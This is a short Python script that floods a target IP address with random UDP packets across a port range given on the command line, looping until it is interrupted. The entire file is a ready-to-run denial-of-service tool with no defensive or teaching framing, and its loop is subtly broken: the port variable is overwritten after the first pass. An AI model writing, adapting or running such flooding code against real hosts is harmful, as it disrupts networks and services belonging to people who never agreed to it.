#import socket
from socket import socket, AF_INET, SOCK_DGRAM
from random import _urandom
from sys import argv

def to_KB(B):
    return B/2**10

def udp_flood(ip, port_range, verbose = False):
    S = socket(AF_INET, SOCK_DGRAM)
    start = int(port_range[0])
    end = int(port_range[1])

    j = 1
    pkt_length = 1024
    while 1:
        try:
            pkt = _urandom(pkt_length)

            [S.sendto(pkt,(ip,start)) for start in range(start,end)]

            if verbose: print('Flooded ports %d - %d, %d times' % (start, end, j)) 
            else: continue
            j += 1 
        except KeyboardInterrupt:
            exit()

    return
if __name__ == "__main__":
    ipv4 = argv[1]
    start, end = argv[2].split('-')
    udp_flood(argv[1],[start, end],True)
